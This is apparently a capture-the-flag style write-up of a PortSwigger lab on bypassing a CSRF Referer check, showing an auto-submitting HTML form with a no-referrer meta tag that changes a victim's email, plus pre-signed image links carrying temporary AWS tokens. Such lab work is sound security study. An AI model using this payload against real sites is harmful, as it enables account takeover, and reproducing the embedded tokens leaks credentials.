# CSRF where Referer validation depends on header being present

### Goal - 

use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address.

### Analysis/Exploitation -

Login as user `wiener`:

Update the email 

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/c4cea6d5-2dc5-4788-a3a5-cf1b7358304b/2024-02-27_15-29.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466Q7NBBOSZ%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T221854Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIDX%2F%2Fteb%2BX2rMpZzLHn31BjYyqcq6ltJll9LUh9oYYwdAiABH0ihx9GR7DWEHP1L744iDJg6bLbCGQ%2BUqozYYpXs0CqIBAiv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMtaGoxEJrXY03wbA8KtwD9cxRqzQHf0LXtWQ5ZyjqD6q52cpuxHn8sH3yvlARF3T%2FhTAMM%2BgFBXUdpDWu5%2FL23%2BY95rUjEjgtxMsh%2FAcMMkcHy%2BFygqu%2FrjXEMhauOOE9qVmCgp9HnNvXVlM37qiPVPeHLUXeXLdfrchobv5oxeQgvDhCNhQoPcs6RJq1TGM1OJAIz5BpesBWej9xjC1nwTq6%2FtD4nOyz6nCrZkSo7COYdfiqBYqiFNJh85Qw1qJo2TZTMPtw54enDUxPRc7BPtHhoRfi%2BNwV0QLxzHtPUR5p0hOeRGsPEEbaW%2FmhFzobGfV%2BhTtPEdWOLfuLMLOtKl6c4CHeYjZ2aXP0SVebtfCWaCl3XMHiwEA7zlk3Y0ruAClE9TRnrTxHh1blzQ8eQcQE04SUsmrnpg66QsrdyGDbHS1RT3PV8wO6xXAGmeDkA9ziYxBfrDY4oycKoV4EgBexgHtVEU4XImd2cXI6ApJJT5CXXTbogHMAJy5GC%2BVkajM42ESJ9hoQVWfejuJFMODsOkcfox4B3nOIg7%2F3iu4fjtzXEjjEhMHKpP45Pv5YgKCZjZpEe8skpebjUm7Vhz3bLSBeXrNN0V2tEFMjdG0I3IGeGUqwyu3r%2Fi4J0GX6sBoNqqGQ2%2BjiIWcwyoWj1AY6pgECb8lIci8LTsstCl6GCHjfz%2FMpblbfq6coBSRAs5yapdnZf0hs%2B53gbL1Z1mPj7c2z00YgOHkvoCE5bRE8v3tj55QJ4DZv6xX0NFpdsdBeBonj2hV55eTlz93OzwhYKAzaPyW0Iam%2B6OMo73o2%2BUA707ZzTPw1iI9ivRsQz1Mbg61GXLQdseIZKEKVo5wlwG5XfWykUEaZw3SfpM78z6bSL%2Fp3m2Hq&X-Amz-Signature=33612364f6620877d804a930c5809bfedf6e776d77a55864101e75a204e5c52f&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

> 💡 In order for a CSRF attack to be possible:

  - A relevant action: change a users email
  - Cookie-based session handling: session cookie
  - No unpredictable request parameters: no csrf token
**Generate CSRF PoC** (in prof. version.) or  
**craft a HTML form that performs CSRF attack to the victim:**

use the `exploit server` to test CSRF attack!

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/10ba55c1-6334-4b67-90ca-bbc7fb1d9293/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466Q7NBBOSZ%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T221854Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIDX%2F%2Fteb%2BX2rMpZzLHn31BjYyqcq6ltJll9LUh9oYYwdAiABH0ihx9GR7DWEHP1L744iDJg6bLbCGQ%2BUqozYYpXs0CqIBAiv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMtaGoxEJrXY03wbA8KtwD9cxRqzQHf0LXtWQ5ZyjqD6q52cpuxHn8sH3yvlARF3T%2FhTAMM%2BgFBXUdpDWu5%2FL23%2BY95rUjEjgtxMsh%2FAcMMkcHy%2BFygqu%2FrjXEMhauOOE9qVmCgp9HnNvXVlM37qiPVPeHLUXeXLdfrchobv5oxeQgvDhCNhQoPcs6RJq1TGM1OJAIz5BpesBWej9xjC1nwTq6%2FtD4nOyz6nCrZkSo7COYdfiqBYqiFNJh85Qw1qJo2TZTMPtw54enDUxPRc7BPtHhoRfi%2BNwV0QLxzHtPUR5p0hOeRGsPEEbaW%2FmhFzobGfV%2BhTtPEdWOLfuLMLOtKl6c4CHeYjZ2aXP0SVebtfCWaCl3XMHiwEA7zlk3Y0ruAClE9TRnrTxHh1blzQ8eQcQE04SUsmrnpg66QsrdyGDbHS1RT3PV8wO6xXAGmeDkA9ziYxBfrDY4oycKoV4EgBexgHtVEU4XImd2cXI6ApJJT5CXXTbogHMAJy5GC%2BVkajM42ESJ9hoQVWfejuJFMODsOkcfox4B3nOIg7%2F3iu4fjtzXEjjEhMHKpP45Pv5YgKCZjZpEe8skpebjUm7Vhz3bLSBeXrNN0V2tEFMjdG0I3IGeGUqwyu3r%2Fi4J0GX6sBoNqqGQ2%2BjiIWcwyoWj1AY6pgECb8lIci8LTsstCl6GCHjfz%2FMpblbfq6coBSRAs5yapdnZf0hs%2B53gbL1Z1mPj7c2z00YgOHkvoCE5bRE8v3tj55QJ4DZv6xX0NFpdsdBeBonj2hV55eTlz93OzwhYKAzaPyW0Iam%2B6OMo73o2%2BUA707ZzTPw1iI9ivRsQz1Mbg61GXLQdseIZKEKVo5wlwG5XfWykUEaZw3SfpM78z6bSL%2Fp3m2Hq&X-Amz-Signature=1fd79173c08bf4d3de6f783bb62a27aca2b91858bf943662ee121dfd07a056d7&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/284bd78e-f50c-4407-a692-7550d0ba1fd0/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466Q7NBBOSZ%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T221854Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIDX%2F%2Fteb%2BX2rMpZzLHn31BjYyqcq6ltJll9LUh9oYYwdAiABH0ihx9GR7DWEHP1L744iDJg6bLbCGQ%2BUqozYYpXs0CqIBAiv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMtaGoxEJrXY03wbA8KtwD9cxRqzQHf0LXtWQ5ZyjqD6q52cpuxHn8sH3yvlARF3T%2FhTAMM%2BgFBXUdpDWu5%2FL23%2BY95rUjEjgtxMsh%2FAcMMkcHy%2BFygqu%2FrjXEMhauOOE9qVmCgp9HnNvXVlM37qiPVPeHLUXeXLdfrchobv5oxeQgvDhCNhQoPcs6RJq1TGM1OJAIz5BpesBWej9xjC1nwTq6%2FtD4nOyz6nCrZkSo7COYdfiqBYqiFNJh85Qw1qJo2TZTMPtw54enDUxPRc7BPtHhoRfi%2BNwV0QLxzHtPUR5p0hOeRGsPEEbaW%2FmhFzobGfV%2BhTtPEdWOLfuLMLOtKl6c4CHeYjZ2aXP0SVebtfCWaCl3XMHiwEA7zlk3Y0ruAClE9TRnrTxHh1blzQ8eQcQE04SUsmrnpg66QsrdyGDbHS1RT3PV8wO6xXAGmeDkA9ziYxBfrDY4oycKoV4EgBexgHtVEU4XImd2cXI6ApJJT5CXXTbogHMAJy5GC%2BVkajM42ESJ9hoQVWfejuJFMODsOkcfox4B3nOIg7%2F3iu4fjtzXEjjEhMHKpP45Pv5YgKCZjZpEe8skpebjUm7Vhz3bLSBeXrNN0V2tEFMjdG0I3IGeGUqwyu3r%2Fi4J0GX6sBoNqqGQ2%2BjiIWcwyoWj1AY6pgECb8lIci8LTsstCl6GCHjfz%2FMpblbfq6coBSRAs5yapdnZf0hs%2B53gbL1Z1mPj7c2z00YgOHkvoCE5bRE8v3tj55QJ4DZv6xX0NFpdsdBeBonj2hV55eTlz93OzwhYKAzaPyW0Iam%2B6OMo73o2%2BUA707ZzTPw1iI9ivRsQz1Mbg61GXLQdseIZKEKVo5wlwG5XfWykUEaZw3SfpM78z6bSL%2Fp3m2Hq&X-Amz-Signature=84a167e4b6b0e6f2eb4cf1379c962fdfe003b1af87ebcaedf10eb104d160e93c&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/49d61922-5ef6-44ef-bd44-dce28f076652/2024-02-27_15-45.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466Q7NBBOSZ%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T221854Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIDX%2F%2Fteb%2BX2rMpZzLHn31BjYyqcq6ltJll9LUh9oYYwdAiABH0ihx9GR7DWEHP1L744iDJg6bLbCGQ%2BUqozYYpXs0CqIBAiv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMtaGoxEJrXY03wbA8KtwD9cxRqzQHf0LXtWQ5ZyjqD6q52cpuxHn8sH3yvlARF3T%2FhTAMM%2BgFBXUdpDWu5%2FL23%2BY95rUjEjgtxMsh%2FAcMMkcHy%2BFygqu%2FrjXEMhauOOE9qVmCgp9HnNvXVlM37qiPVPeHLUXeXLdfrchobv5oxeQgvDhCNhQoPcs6RJq1TGM1OJAIz5BpesBWej9xjC1nwTq6%2FtD4nOyz6nCrZkSo7COYdfiqBYqiFNJh85Qw1qJo2TZTMPtw54enDUxPRc7BPtHhoRfi%2BNwV0QLxzHtPUR5p0hOeRGsPEEbaW%2FmhFzobGfV%2BhTtPEdWOLfuLMLOtKl6c4CHeYjZ2aXP0SVebtfCWaCl3XMHiwEA7zlk3Y0ruAClE9TRnrTxHh1blzQ8eQcQE04SUsmrnpg66QsrdyGDbHS1RT3PV8wO6xXAGmeDkA9ziYxBfrDY4oycKoV4EgBexgHtVEU4XImd2cXI6ApJJT5CXXTbogHMAJy5GC%2BVkajM42ESJ9hoQVWfejuJFMODsOkcfox4B3nOIg7%2F3iu4fjtzXEjjEhMHKpP45Pv5YgKCZjZpEe8skpebjUm7Vhz3bLSBeXrNN0V2tEFMjdG0I3IGeGUqwyu3r%2Fi4J0GX6sBoNqqGQ2%2BjiIWcwyoWj1AY6pgECb8lIci8LTsstCl6GCHjfz%2FMpblbfq6coBSRAs5yapdnZf0hs%2B53gbL1Z1mPj7c2z00YgOHkvoCE5bRE8v3tj55QJ4DZv6xX0NFpdsdBeBonj2hV55eTlz93OzwhYKAzaPyW0Iam%2B6OMo73o2%2BUA707ZzTPw1iI9ivRsQz1Mbg61GXLQdseIZKEKVo5wlwG5XfWykUEaZw3SfpM78z6bSL%2Fp3m2Hq&X-Amz-Signature=fa65417f232237d8c9d8f6c986d4d1b53b75b09f9251d6e9e4252999ff9c07da&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

Since the `Referer` HTTP header can be fully controlled by the attacker, we can bypass this check!

send this request into Repeater and simply remove the referrer header, 

The request goes through and the email gets changed

In this case I need to coerce the browser of the victim to not send the referrer header.

> 💡 **According to **[**Mozilla web docs**](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy)**, we can use the **`<meta>`** tag to ignore **`Referer`** HTTP header:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/CSRF/CSRF-11/images/Pasted%20image%2020221215051342.png)

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/CSRF/CSRF-11/images/Pasted%20image%2020221215051352.png)

**To bypass that, add a new **`<meta>`** tag to ignore **`Referer`** header:**

 integrate directive into the HTML code itself:

```html
<html>
  <head>
	    <meta name="referrer" content="no-referrer">
    </head>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a2b0080046a2b6781242625009d001c.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test1&#64;domain&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/f91b02fc-1932-415d-9fbe-0af59f93a9c2/2024-02-27_16-07.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466Q7NBBOSZ%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T221854Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIDX%2F%2Fteb%2BX2rMpZzLHn31BjYyqcq6ltJll9LUh9oYYwdAiABH0ihx9GR7DWEHP1L744iDJg6bLbCGQ%2BUqozYYpXs0CqIBAiv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMtaGoxEJrXY03wbA8KtwD9cxRqzQHf0LXtWQ5ZyjqD6q52cpuxHn8sH3yvlARF3T%2FhTAMM%2BgFBXUdpDWu5%2FL23%2BY95rUjEjgtxMsh%2FAcMMkcHy%2BFygqu%2FrjXEMhauOOE9qVmCgp9HnNvXVlM37qiPVPeHLUXeXLdfrchobv5oxeQgvDhCNhQoPcs6RJq1TGM1OJAIz5BpesBWej9xjC1nwTq6%2FtD4nOyz6nCrZkSo7COYdfiqBYqiFNJh85Qw1qJo2TZTMPtw54enDUxPRc7BPtHhoRfi%2BNwV0QLxzHtPUR5p0hOeRGsPEEbaW%2FmhFzobGfV%2BhTtPEdWOLfuLMLOtKl6c4CHeYjZ2aXP0SVebtfCWaCl3XMHiwEA7zlk3Y0ruAClE9TRnrTxHh1blzQ8eQcQE04SUsmrnpg66QsrdyGDbHS1RT3PV8wO6xXAGmeDkA9ziYxBfrDY4oycKoV4EgBexgHtVEU4XImd2cXI6ApJJT5CXXTbogHMAJy5GC%2BVkajM42ESJ9hoQVWfejuJFMODsOkcfox4B3nOIg7%2F3iu4fjtzXEjjEhMHKpP45Pv5YgKCZjZpEe8skpebjUm7Vhz3bLSBeXrNN0V2tEFMjdG0I3IGeGUqwyu3r%2Fi4J0GX6sBoNqqGQ2%2BjiIWcwyoWj1AY6pgECb8lIci8LTsstCl6GCHjfz%2FMpblbfq6coBSRAs5yapdnZf0hs%2B53gbL1Z1mPj7c2z00YgOHkvoCE5bRE8v3tj55QJ4DZv6xX0NFpdsdBeBonj2hV55eTlz93OzwhYKAzaPyW0Iam%2B6OMo73o2%2BUA707ZzTPw1iI9ivRsQz1Mbg61GXLQdseIZKEKVo5wlwG5XfWykUEaZw3SfpM78z6bSL%2Fp3m2Hq&X-Amz-Signature=3f6fbedce777758547d05c8bcd0bfdbc16a8cedc3c56252a9f9558baa0a00adf&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

or As an alternative, update exploit page header with the relevant syntax:

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/e1cd84d1-fe2e-4ac3-bbc1-2a85212aa532/2024-02-27_16-05.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466Q7NBBOSZ%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T221854Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIDX%2F%2Fteb%2BX2rMpZzLHn31BjYyqcq6ltJll9LUh9oYYwdAiABH0ihx9GR7DWEHP1L744iDJg6bLbCGQ%2BUqozYYpXs0CqIBAiv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMtaGoxEJrXY03wbA8KtwD9cxRqzQHf0LXtWQ5ZyjqD6q52cpuxHn8sH3yvlARF3T%2FhTAMM%2BgFBXUdpDWu5%2FL23%2BY95rUjEjgtxMsh%2FAcMMkcHy%2BFygqu%2FrjXEMhauOOE9qVmCgp9HnNvXVlM37qiPVPeHLUXeXLdfrchobv5oxeQgvDhCNhQoPcs6RJq1TGM1OJAIz5BpesBWej9xjC1nwTq6%2FtD4nOyz6nCrZkSo7COYdfiqBYqiFNJh85Qw1qJo2TZTMPtw54enDUxPRc7BPtHhoRfi%2BNwV0QLxzHtPUR5p0hOeRGsPEEbaW%2FmhFzobGfV%2BhTtPEdWOLfuLMLOtKl6c4CHeYjZ2aXP0SVebtfCWaCl3XMHiwEA7zlk3Y0ruAClE9TRnrTxHh1blzQ8eQcQE04SUsmrnpg66QsrdyGDbHS1RT3PV8wO6xXAGmeDkA9ziYxBfrDY4oycKoV4EgBexgHtVEU4XImd2cXI6ApJJT5CXXTbogHMAJy5GC%2BVkajM42ESJ9hoQVWfejuJFMODsOkcfox4B3nOIg7%2F3iu4fjtzXEjjEhMHKpP45Pv5YgKCZjZpEe8skpebjUm7Vhz3bLSBeXrNN0V2tEFMjdG0I3IGeGUqwyu3r%2Fi4J0GX6sBoNqqGQ2%2BjiIWcwyoWj1AY6pgECb8lIci8LTsstCl6GCHjfz%2FMpblbfq6coBSRAs5yapdnZf0hs%2B53gbL1Z1mPj7c2z00YgOHkvoCE5bRE8v3tj55QJ4DZv6xX0NFpdsdBeBonj2hV55eTlz93OzwhYKAzaPyW0Iam%2B6OMo73o2%2BUA707ZzTPw1iI9ivRsQz1Mbg61GXLQdseIZKEKVo5wlwG5XfWykUEaZw3SfpM78z6bSL%2Fp3m2Hq&X-Amz-Signature=986df0e27ffd449ba2470734f38a6a2fbc7ebbc4e67c979916b173edc40937fb&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
